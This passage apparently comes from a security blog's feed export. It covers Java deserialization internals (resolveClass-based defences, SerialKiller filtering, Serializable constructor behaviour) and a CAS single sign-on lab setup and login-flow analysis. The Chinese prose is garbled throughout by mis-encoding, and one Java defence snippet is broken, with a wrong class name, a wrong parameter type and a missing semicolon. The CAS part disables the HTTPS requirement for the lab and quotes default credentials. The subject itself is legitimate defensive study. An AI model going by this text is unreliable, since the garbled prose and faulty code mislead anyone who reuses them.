<p>å¯ä»¥çœ‹åˆ°åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¸–ç•Œä¸Šæ˜¯å†™å…¥äº†å„å­—æ®µé•¿åº¦çš„ï¼Œæ‰€ä»¥åœ¨åé¢ååºåˆ—åŒ–è¯»çš„æ—¶å€™æ˜¯æŒ‰ç…§å­—æ®µé•¿åº¦æ¥è¿›è¡Œè¯»å–çš„ã€‚<strong>è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆåœ¨ååºåˆ—åŒ–æ•°æ®åé¢æ’å…¥è„æ•°æ®ä¼šä¸ä¼šå½±å“ååºåˆ—åŒ–</strong>ã€‚</p>
<h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><h3 id="é¢„å¤„ç†-1"><a href="#é¢„å¤„ç†-1" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h3><p>ååºåˆ—åŒ–å’Œåºåˆ—åŒ–äº’ä¸ºç§°æ“ä½œï¼Œå…¶ä¸»è¦çš„æ“ä½œåœ¨readObject0é‡Œé¢<br><img src="1579081394980-e507b22c-1658-4b07-b841-ba11924dcecb.png#align=left&display=inline&height=217&name=image.png&originHeight=434&originWidth=1926&size=114185&status=done&style=none&width=963" alt="image.png"></p>
<p>caseåˆ°objectè¿›è¡Œååºåˆ—åŒ–ï¼Œæ•´ä¸ªobjectçš„ååºåŒ–åœ¨readOrdinaryObjectä¸­<br><img src="1579081417550-f6a84856-864a-4e96-bbb9-f92cfffeffa2.png#align=left&display=inline&height=62&name=image.png&originHeight=100&originWidth=1202&size=18103&status=done&style=none&width=746" alt="image.png"></p>
<p>å’Œåºåˆ—åŒ–å¯¹ç§°è¿˜æ˜¯åˆ†ä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥æ˜¯è¯»å–å‡ºç±»çš„å…ƒä¿¡æ¯ï¼ˆreadClassDescï¼‰ï¼Œç¬¬äºŒæ­¥æ˜¯è¯»å–å‡ºå¯¹è±¡å±æ€§å…·ä½“çš„æ•°æ®ï¼ˆreadSerialDataï¼‰ã€‚<br><img src="1579097989089-bb47e454-4a63-4f1f-adba-b23a19fddfdf.png#align=left&display=inline&height=657&name=image.png&originHeight=1314&originWidth=2282&size=361847&status=done&style=none&width=1141" alt="image.png"></p>
<h3 id="ååºåˆ—åŒ–æ•°æ®"><a href="#ååºåˆ—åŒ–æ•°æ®" class="headerlink" title="ååºåˆ—åŒ–æ•°æ®"></a>ååºåˆ—åŒ–æ•°æ®</h3><h4 id="readClassDesc"><a href="#readClassDesc" class="headerlink" title="readClassDesc"></a>readClassDesc</h4><p>åœ¨åºåˆ—åŒ–é‚£é‡Œæåˆ°è¿‡ï¼Œå¯¹æŠŠç±»ç±»å‹åˆ†æˆå››ä¸ªç±»å‹å¤„ç†ï¼Œè¿™é‡Œçš„Useræ˜¯éä»£ç†æ™®é€šç±»ï¼Œå°±èµ°readNonProxyDescã€‚<br><img src="1579098107741-afcde48d-8a7a-4d1f-83be-c826002ecee5.png#align=left&display=inline&height=525&name=image.png&originHeight=1050&originWidth=2250&size=280701&status=done&style=none&width=1125" alt="image.png"></p>
<p>readNonProxyDescä¸­ä¸»è¦çš„æ“ä½œåœ¨readClassDescriptorã€resolveClassã€initNonProxyï¼ˆ<strong>æ³¨æ„è¿™é‡ŒinitNonProxyçš„æœ€åä¸€ä¸ªä¼ å‚ï¼Œè¿™é‡Œé€’å½’è°ƒç”¨äº†readClassDesc</strong>ï¼‰ã€‚<br><img src="1579098941907-9785fe5c-79de-442c-9632-f8366c6f50bc.png#align=left&display=inline&height=762&name=image.png&originHeight=1524&originWidth=2322&size=485982&status=done&style=none&width=1161" alt="image.png"></p>
<p>readClassDescriptorè¯»å‡ºäº†ç±»çš„å…ƒæ•°æ®å¹¶æŠŠæ¯ä¸€ä¸ªå±æ€§åæŠ½è±¡æˆäº†ObjectStreamFieldç±»<br><img src="1579098457484-d2b7c5d1-7498-4b1b-84fb-4697e163e69c.png#align=left&display=inline&height=744&name=image.png&originHeight=1488&originWidth=2144&size=459960&status=done&style=none&width=1072" alt="image.png"></p>
<p>resolveClasså¯¹ç±»ç±»å‹è¿›è¡Œäº†æ„å»ºï¼Œæ³¨æ„è¿™é‡Œç¬¬äºŒå‚æ•°ä¸ºfalseï¼Œæ„å‘³ç€å¹¶ä¸ä¼šæ‰§è¡Œç±»çš„åˆå§‹åŒ–ï¼ˆstaticä»£ç å—ä¸æ‰§è¡Œï¼‰<br>ã€‚</p>
<p><img src="1579098865240-c1eebc8c-097a-4c4b-a621-fa41f37583a1.png#align=left&display=inline&height=293&name=image.png&originHeight=586&originWidth=2098&size=135558&status=done&style=none&width=1049" alt="image.png"></p>
<p><strong>å¦å¤–æ³¨æ„è¿™é‡Œè§£é‡Šäº†ä¸ºä»€ä¹ˆè®¾ç½®ååºåˆ—åŒ–é˜²å¾¡çš„ç‚¹æ˜¯åœ¨resolveClassï¼Œå¦‚æœæƒ³å¯¹ååºåˆ—åŒ–è®¾ç½®é˜²å¾¡ï¼Œå°±éœ€è¦è‡ªå·±å®ç°ä¸€ä¸ªObjectInputStreamã€‚</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObjInputStream</span> <span class="keyword">extends</span> <span class="title">ObjInputStream</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyObjInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjInputStream desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">"defence"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>initNonProxyåˆæ„å»ºäº†ç±»çš„å…ƒä¿¡æ¯ã€‚<br><img src="1579099519793-d21fcdc2-bccf-411c-bef1-5e517f4e508f.png#align=left&display=inline&height=474&name=image.png&originHeight=948&originWidth=1518&size=180999&status=done&style=none&width=759" alt="image.png"></p>
<p>æœ€ådescï¼ˆObjectStreamClassï¼‰ä¼ å‡ºç»™å¤–å±‚readOrdinaryObjectã€‚é¦–å…ˆä¼šè¿›è¡Œå¯¹è±¡çš„åˆå§‹åŒ–ï¼Œç„¶åè¯»å‡ºæ•°æ®æ³¨å…¥ç±»ä¸­ã€‚<br><img src="1579099650702-8f1fa375-96f9-4d7e-86e2-f6e25abf5621.png#align=left&display=inline&height=355&name=image.png&originHeight=710&originWidth=1720&size=154285&status=done&style=none&width=860" alt="image.png"></p>
<h4 id="readSerialData"><a href="#readSerialData" class="headerlink" title="readSerialData"></a>readSerialData</h4><p>å¦‚æœæˆ‘ä»¬è‡ªå®šä¹‰äº†readObjectæ–¹æ³•ï¼Œé‚£ä¹ˆè¿™é‡Œå°±ä¼šinvokeï¼Œ<strong>è¿™é‡Œè§£é‡Šäº†ä¸ºä»€ä¹ˆå°±javaååºåˆ—åŒ–ä½¿ç”¨è€Œè¨€æ˜¯ååºåˆ—åŒ–ç±»çš„readObjectå¼€å§‹ã€‚</strong><br><img src="1579101128866-30f3281e-d43c-4033-aa18-e81302113c73.png#align=left&display=inline&height=435&name=image.png&originHeight=870&originWidth=2158&size=270819&status=done&style=none&width=1079" alt="image.png"></p>
<p>ä½†æ˜¯åœ¨Userç±»ä¸­åœ¨æˆ‘ä»¬å¹¶æ²¡æœ‰è‡ªå®šä¹‰ååºåˆ—åŒ–æ–¹æ³•éšæ„è¿˜æ˜¯èµ°é»˜è®¤è·¯çº¿ã€‚<br><img src="1579099806423-394e2869-54a0-41a1-ab91-84de80fde8de.png#align=left&display=inline&height=548&name=image.png&originHeight=1096&originWidth=2446&size=295874&status=done&style=none&width=1223" alt="image.png"></p>
<p>defaultReadFieldsï¼Œä¸­ç¬¬ä¸€ä¸ªå¾ªç¯æŠŠåŸç”Ÿç±»å‹æ•°æ®èµ‹ç»™objï¼Œç¬¬äºŒä¸ªå¾ªç¯æŠŠæ•°ç»„ã€æšä¸¾ç±»å‹ã€å¯¹è±¡ç±»å‹èµ‹ç»™objã€‚<br><img src="1579099910627-5e87fc03-44b5-4eca-a2e2-3d75b83f0fd8.png#align=left&display=inline&height=632&name=image.png&originHeight=1264&originWidth=2000&size=336960&status=done&style=none&width=1000" alt="image.png"></p>
<p>è¡¥å……ä¸€å¼ æ•´ä¸ªååºåˆ—åŒ–çš„æ—¶åºå›¾ã€‚<br><img src="1579141111812-93300e7b-b9e9-4e5c-a4d7-640bb1a38793.png#align=left&display=inline&height=801&name=image.png&originHeight=1602&originWidth=2582&size=1407262&status=done&style=none&width=1291" alt="image.png"></p>
<h2 id="ä»SerialKilleræ¥javaååºåˆ—åŒ–é˜²å¾¡"><a href="#ä»SerialKilleræ¥javaååºåˆ—åŒ–é˜²å¾¡" class="headerlink" title="ä»SerialKilleræ¥javaååºåˆ—åŒ–é˜²å¾¡"></a>ä»SerialKilleræ¥javaååºåˆ—åŒ–é˜²å¾¡</h2><p><a href="https://github.com/ikkisoft/SerialKiller">https://github.com/ikkisoft/SerialKiller</a><br>åŸç”Ÿä½¿ç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(is);</span><br><span class="line">String msg = (String) ois.readObject();</span><br></pre></td></tr></table></figure>

<p>åŠ ä¸ŠSerialKilleråçš„ä½¿ç”¨</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream ois = <span class="keyword">new</span> SerialKiller(is, <span class="string">"/etc/serialkiller.conf"</span>);</span><br><span class="line">String msg = (String) ois.readObject();</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å®ƒçš„åŸç†å°±æ˜¯ä¸Šé¢æçš„è‡ªå·±å®ç°æµå¹¶ä¸”åœ¨resolveClasså¤„åŠ ä¸Šç™½åå•æˆ–è€…é»‘åå•çš„è¿‡æ»¤ã€‚<br><img src="1581650629068-43309a6e-425b-40e0-a375-61538f1648db.png#align=left&display=inline&height=786&name=image.png&originHeight=1572&originWidth=2024&size=259760&status=done&style=none&width=1012" alt="image.png"></p>
<h2 id="æ‚"><a href="#æ‚" class="headerlink" title="æ‚"></a>æ‚</h2><p>å½“çˆ¶å­æ¥å£åŒæ—¶å®ç°äº†Serializableæ¥å£æ—¶</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserBase</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    UserBase()&#123;</span><br><span class="line">        System.out.println(<span class="string">"UserBaseæ— å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UserBase(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">"UserBaseæœ‰å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User2</span> <span class="keyword">extends</span> <span class="title">UserBase</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User2()&#123;</span><br><span class="line">        System.out.println(<span class="string">"User2æ— å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    User2(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">"User2æœ‰å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ§åˆ¶å°è¾“å‡º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UserBaseæ— å‚æ„é€ </span><br><span class="line">User2æœ‰å‚æ„é€ </span><br><span class="line">-----------------</span><br><span class="line">2333</span><br></pre></td></tr></table></figure>

<p>å½“åªæœ‰å­ç±»å®ç°Serializableæ¥å£çˆ¶ç±»æ²¡æœ‰å®ç°æ—¶ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerialAndUnserial</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectOutputStream oops = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./serializable.txt"</span>));</span><br><span class="line">        oops.writeObject(<span class="keyword">new</span> User2(<span class="number">2333</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"-----------------"</span>);</span><br><span class="line">        ObjectInputStream oips = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./serializable.txt"</span>));</span><br><span class="line">        User2 user = (User2) oips.readObject();</span><br><span class="line"></span><br><span class="line">        System.out.println(user.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserBase</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    UserBase()&#123;</span><br><span class="line">        System.out.println(<span class="string">"UserBaseæ— å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UserBase(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">"UserBaseæœ‰å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User2</span> <span class="keyword">extends</span> <span class="title">UserBase</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User2()&#123;</span><br><span class="line">        System.out.println(<span class="string">"User2æ— å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    User2(<span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">"User2æœ‰å‚æ„é€ "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UserBaseæ— å‚æ„é€ </span><br><span class="line">User2æœ‰å‚æ„é€ </span><br><span class="line">-----------------</span><br><span class="line">UserBaseæ— å‚æ„é€ </span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“åŠä¸€äº›tip"><a href="#æ€»ç»“åŠä¸€äº›tip" class="headerlink" title="æ€»ç»“åŠä¸€äº›tip"></a>æ€»ç»“åŠä¸€äº›tip</h2><ul>
<li>åºåˆ—åŒ–æ—¶ï¼Œå½“å†™å…¥ç±»çš„å…ƒæ•°æ®çš„æ—¶å€™ï¼Œæ˜¯å…ˆå†™å­ç±»çš„ç±»å…ƒæ•°æ®ï¼Œç„¶åé€’å½’è°ƒç”¨çš„å†™å…¥çˆ¶ç±»çš„ç±»å…ƒæ•°æ®ï¼ˆåªæœ‰å®ç°åºåˆ—åŒ–æ¥å£çš„æ‰ä¼šæœ‰ç±»å…ƒæ•°æ®ï¼‰ã€‚</li>
<li>é˜²å¾¡ååºåˆ—åŒ–çš„åŸç†æ˜¯åœ¨resolveClasså¤„è®¾é˜²è€Œä¸æ˜¯readResolve</li>
<li>åœ¨åºåˆ—åŒ–æ•°æ®æœ«å°¾åŠ å…¥è„æ•°æ®ä¸ä¼šå½±å“æ­£å¸¸çš„ååºåˆ—åŒ–ã€‚</li>
</ul>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/qq_36744284/article/details/89604011">javaä¸­çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åŠå…¶æºç åˆ†æï¼ˆç‰¹åˆ«è¯¦ç»†ï¼‰</a><br><a href="http://xxlegend.com/2018/06/20/%E5%85%88%E7%9F%A5%E8%AE%AE%E9%A2%98%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%20%E8%A7%A3%E8%AF%BB/">å…ˆçŸ¥å¤§ä¼šè®®é¢˜Javaååºåˆ—åŒ–å®æˆ˜</a><br>[ä»WebLogicçœ‹ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ä¸é˜²å¾¡](</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>CASçš„æ­å»ºåŠè®¤è¯æµç¨‹åˆ†æä¸æ¯”è¾ƒ</title>
    <url>/2020/01/31/CAS%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E6%AF%94%E8%BE%83/</url>
    <content><![CDATA[<!-- more -->

<h2 id="CAS-ç®€ä»‹"><a href="#CAS-ç®€ä»‹" class="headerlink" title="CAS ç®€ä»‹"></a>CAS ç®€ä»‹</h2><p>CASæ˜¯ä¸€ä¸ªå•ç‚¹ç™»å½•ï¼ˆSingle Sign On,ç®€ç§°SSOï¼ŒSSOä½¿å¾—åœ¨å¤šä¸ªåº”ç”¨ç³»ç»Ÿä¸­ï¼Œç”¨æˆ·åªéœ€è¦ç™»å½•ä¸€æ¬¡å°±å¯ä»¥è®¿é—®æ‰€æœ‰ç›¸äº’ä¿¡ä»»çš„åº”ç”¨ç³»ç»Ÿï¼‰æ¡†æ¶ï¼Œå¼€å§‹æ˜¯ç”±è€¶é²å¤§å­¦çš„ä¸€ä¸ªç»„ç»‡å¼€å‘ï¼Œåæ¥å½’åˆ°apereoå»ç®¡ã€‚</p>
<h2 id="CAS-Serveræ­å»º"><a href="#CAS-Serveræ­å»º" class="headerlink" title="CAS Serveræ­å»º"></a>CAS Serveræ­å»º</h2><p>åœ¨æ­¤ä¸‹è½½ï¼š<a href="https://github.com/apereo/cas/tree/4.1.x">https://github.com/apereo/cas/tree/4.1.x</a><br>é€šå¸¸æ¥è¯´ç”¨mvnç¼–è¯‘cas-server-webappåæ”¾åˆ°tomcatä¸­å°±è¡Œï¼Œä½†æ˜¯casé»˜è®¤éœ€è¦èµ°httpsï¼Œå¦åˆ™åœ¨ç™»é™†æµç¨‹å’Œè·³è½¬webappæµç¨‹ä¸­ä¼šå‡ºç°å¦‚ä¸‹ä¸¤ç§æŠ¥é”™ã€‚<br><img src="1580368543216-ba5d0a82-fc02-4225-9a7c-cc0c168f604b.png#align=left&display=inline&height=287&name=image.png&originHeight=574&originWidth=2072&size=171406&status=done&style=none&width=1036" alt="image.png"></p>
<p><img src="1580368461615-7a24430e-9bf3-4689-9c3b-e9168d2d177d.png#align=left&display=inline&height=330&name=image.png&originHeight=660&originWidth=2114&size=175710&status=done&style=none&width=1057" alt="image.png"></p>
<p>ç¬¬ä¸€ç§è§£å†³åŠæ³•æ˜¯ç”Ÿæˆä¸€ä¸ªè‡ªç­¾åçš„sslè¯ä¹¦å¹¶åœ¨tomcatçš„server.xmlä¸­é…ç½®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">keytool -genkey -<span class="built_in">alias</span> tomcat -keyalg RSA -keystore /path/to/my/keystore</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8443"</span> <span class="attr">protocol</span>=<span class="string">"org.apache.coyote.http11.Http11NioProtocol"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">maxThreads</span>=<span class="string">"150"</span> <span class="attr">SSLEnabled</span>=<span class="string">"true"</span> <span class="attr">scheme</span>=<span class="string">"https"</span> <span class="attr">secure</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">keystoreFile</span>=<span class="string">"$&#123;user.home&#125;/.keystore"</span> <span class="attr">keystorePass</span>=<span class="string">"p@assw0rd"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">clientAuth</span>=<span class="string">"false"</span> <span class="attr">sslProtocol</span>=<span class="string">"TLS"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™ç§æ–¹æ³•å½±å“wiresharkåç»­æŠ“åŒ…åˆ†æï¼Œå¹¶ä¸”é»˜è®¤æƒ…å†µä¸‹CASè¦æ±‚webappä¹Ÿæ˜¯httpsã€‚</p>
<p>ç¬¬äºŒç§åŠæ³•æ˜¯ä¿®æ”¹casé…ç½®ä½¿å…¶å…è®¸httpã€‚æœ‰ä¸‹é¢å››æ­¥ã€‚</p>
<ol>
<li><p>åœ¨<code>p:httpClient-ref=&quot;supportsTrustStoreSslSocketFactoryHttpClient&quot;</code>åå¢åŠ <code>p:requireSecure=&quot;false&quot;</code><img src="1580377596613-3c72dd9e-f517-473f-9eea-e8a86e5e0d16.png#align=left&display=inline&height=103&name=image.png&originHeight=206&originWidth=2182&size=60740&status=done&style=none&width=1091" alt="image.png"></p>
</li>
<li><p>ä¿®æ”¹WEB-INF/spring-configuration/ticketGrantingTicketCookieGenerator.xml<img src="1580377875413-89e3960e-4e30-435c-930b-7f720762d0a1.png#align=left&display=inline&height=135&name=image.png&originHeight=270&originWidth=2218&size=71387&status=done&style=none&width=1109" alt="image.png"></p>
</li>
</ol>
<ol start="3">
<li>ä¿®æ”¹WEB-INF/spring-configuration/warnCookieGenerator.xml<img src="1580377924581-fc1351cc-d72d-4f50-abe3-217a43230b80.png#align=left&display=inline&height=137&name=image.png&originHeight=274&originWidth=2064&size=61824&status=done&style=none&width=1032" alt="image.png"></li>
</ol>
<ol start="4">
<li>ä¿®æ”¹æ³¨å†ŒæœåŠ¡WEB-INF/classes/services/HTTPSandIMAPS-10000001.jsonå°†<code>&quot;serviceId&quot; : &quot;^(https|imaps)://.*&quot;</code>ä¿®æ”¹ä¸º<code>&quot;serviceId&quot; : &quot;^(https|http|imaps)://.*&quot;</code><img src="1580377987989-7a8526d8-9459-4ac3-bf96-66f71578f201.png#align=left&display=inline&height=66&name=image.png&originHeight=120&originWidth=1318&size=22754&status=done&style=none&width=720" alt="image.png"></li>
</ol>
<p>ä¿®æ”¹é‡å¯åè™½ç„¶å‰ç«¯è¿˜æ˜¯ä¼šçˆ†é”™ï¼Œä½†æ˜¯å…¶å®æ­£å¸¸ç™»é™†äº†ã€‚é»˜è®¤çš„å¸å¯†æ˜¯casuser/Mellonï¼Œè®°å½•åœ¨deployerConfigContext.xmlä¸­ã€‚<br><img src="1580356310308-00f8b236-b1d6-43bd-a1d2-a729df5cbf65.png#align=left&display=inline&height=516&name=image.png&originHeight=1032&originWidth=3030&size=386108&status=done&style=none&width=1515" alt="image.png"><br><img src="1580378152394-9517eb31-cb68-4d15-a187-2868a1f7277a.png#align=left&display=inline&height=607&name=image.png&originHeight=1214&originWidth=2150&size=275338&status=done&style=none&width=1075" alt="image.png"></p>
<p><img src="1580378176954-6713c06c-70af-4ac3-9f5c-b0e34fcf8e19.png#align=left&display=inline&height=493&name=image.png&originHeight=986&originWidth=2330&size=226505&status=done&style=none&width=1165" alt="image.png"></p>
<h2 id="Webappæ­å»º"><a href="#Webappæ­å»º" class="headerlink" title="Webappæ­å»º"></a>Webappæ­å»º</h2><p>åœ¨æ­¤ä¸‹è½½ï¼š<a href="https://github.com/UniconLabs/cas-sample-java-webapp">https://github.com/UniconLabs/cas-sample-java-webapp</a><br>ä¿®æ”¹web.xmlä¸­casServerLoginUrlã€casServerUrlPrefixã€serverNameå€¼ã€‚casServerLoginUrlå¯¹åº”cas serveråœ°å€ï¼ˆå¦‚æœæ¥å®¢æ²¡æœ‰ç™»é™†è¿‡webappå°±ä¼šæŠŠæ¥å®¢é‡å®šå‘åˆ°è¿™é‡Œè¿›è¡Œcasç»Ÿä¸€è®¤è¯ï¼‰ï¼ŒcasServerUrlPrefixå¯¹åº”cas serveråœ°å€ï¼ˆè¿™ä¸ªå€¼åç»­ä¼šè·Ÿä¸€äº›apiè·¯å¾„åšæ‹¼æ¥ï¼‰ï¼ŒserverNameæ˜¯webappåœ°å€ã€‚<br><img src="1580380855855-5bfed017-f240-4af9-a5e7-0555444cb000.png#align=left&display=inline&height=485&name=image.png&originHeight=970&originWidth=2062&size=158930&status=done&style=none&width=1031" alt="image.png"></p>
<h2 id="è®¤è¯æµç¨‹åˆ†æ"><a href="#è®¤è¯æµç¨‹åˆ†æ" class="headerlink" title="è®¤è¯æµç¨‹åˆ†æ"></a>è®¤è¯æµç¨‹åˆ†æ</h2><p>ç¯å¢ƒipè¯´æ˜<br>cas serverï¼š172.16.247.1<br>cas webappï¼š172.16.247.139<br>ç”¨æˆ·ï¼š172.16.247.131</p>
<ul>
<li>userè®¿é—®webappï¼Œå› ä¸ºä¹‹å‰ä»æœªç™»é™†è¿‡webappï¼Œæ‰€ä»¥webappä¼šæŠŠuseré‡å®šå‘ç»™casè¿›è¡Œç»Ÿä¸€ç™»é™†ï¼ˆé‡å®šå‘çš„urlçš„serivceä¸­å¸¦æœ‰webappè‡ªå·±çš„urlå¥½è®©casçŸ¥é“userç™»é™†æˆåŠŸåè¯¥é‡å®šå‘å›å“ªé‡Œï¼‰ã€‚<img src="1580383571657-a271c09d-0890-442f-b3f6-6a172f235f53.png#align=left&display=inline&height=243&name=image.png&originHeight=486&originWidth=1854&size=118852&status=done&style=none&width=927" alt="image.png"></li>
<li>useråœ¨casç™»é™†ï¼Œç™»é™†æˆåŠŸåcasä¼šç»™userå¸¦ä¸€ä¸ªcookieï¼ˆTGCä¹Ÿå«TGTï¼Œå¦‚æœä¹‹åè¦ç™»é™†å…¶ä»–webappå°±ä¸ç”¨é‡å¤è¾“å…¥å¯†ç è€Œæ˜¯ç›´æ¥ç»™STäº†ï¼‰å’Œä¸€ä¸ªSTï¼ˆåœ¨location urlä¸­ï¼‰çš„302å›webappã€‚<img src="1580383821801-70d72983-d348-48c3-8a07-c770ec082c77.png#align=left&display=inline&height=262&name=image.png&originHeight=524&originWidth=2476&size=231885&status=done&style=none&width=1238" alt="image.png"></li>
<li>webappæ‹¿åˆ°userè¯·æ±‚è¿‡æ¥çš„STä¼šå‘CASçš„apiå‘é€å·²éªŒè¯STçš„åˆæ³•æ€§ï¼Œå¦‚æœcaséªŒè¯æˆåŠŸä¼šå‘é€ç»™CASçš„æ˜¯æˆåŠŸçš„çŠ¶æ€ä¿¡æ¯å’Œç”¨æˆ·çš„ä¸€äº›æ•°æ®ã€‚<img src="1580384247485-354438d9-9482-4450-8b26-01ada6bd18c4.png#align=left&display=inline&height=147&name=image.png&originHeight=294&originWidth=2190&size=82873&status=done&style=none&width=1095" alt="image.png"><br><img src="1580384287803-1b5da7b9-c455-4ae4-9557-47a1629d157e.png#align=left&display=inline&height=678&name=image.png&originHeight=1356&originWidth=2142&size=177667&status=done&style=none&width=1071" alt="image.png"></li>
<li>webappä»casé‚£é‡Œå¾—çŸ¥STæ˜¯æœ‰æ•ˆçš„ï¼Œç»™userè®¾ç½®cookieï¼ˆç”¨æˆ·ä¹‹åå°±ä¸å¿…å†èµ°ä¸€æ¬¡è¿™ä¸ªæµç¨‹äº†ï¼‰ã€‚å¹¶è®©ç”¨æˆ·æˆåŠŸç™»é™†ã€‚<img src="1580384354171-e57ad4ab-a595-442d-968f-44eef905f385.png#align=left&display=inline&height=103&name=image.png&originHeight=206&originWidth=1736&size=59328&status=done&style=none&width=868" alt="image.png"></li>
</ul>
<p>ä¸€å›¾èƒœåƒè¨€ï¼Œå›¾ç‰‡æ¥è‡ªç½‘ç»œï¼ˆä¾µåˆ ï¼‰ã€‚</p>
<p><img src="1580374514900-55ff9aef-070f-4dc4-9da7-e2a70721372a.png#align=left&display=inline&height=672&name=image.png&originHeight=1344&originWidth=1630&size=652092&status=done&style=none&width=815" alt="image.png"></p>
<h2 id="SSO-vs-Kerberos-vs-OAuth"><a href="#SSO-vs-Kerberos-vs-OAuth" class="headerlink" title="SSO vs Kerberos vs OAuth"></a>SSO vs Kerberos vs OAuth</h2><p>å½“æ—¶çœ‹å®Œæ•´ä¸ªcasçš„è®¤è¯æµç¨‹æ„Ÿè§‰é‡Œé¢ä¸€äº›è¦ç´ å’Œkerberoså’ŒOAuthè®¤è¯å¾ˆç›¸ä¼¼ï¼ˆéƒ½æœ‰ä¸€ä¸ªç¬¬ä¸‰æ–¹æ¥è¿›è¡Œè®¤è¯/æˆæƒï¼‰ã€‚å› æ­¤ç›¸æ¯”è¾ƒä¸€ä¸‹è¿™ä¸‰è€…çš„åŒºåˆ«ã€‚</p>
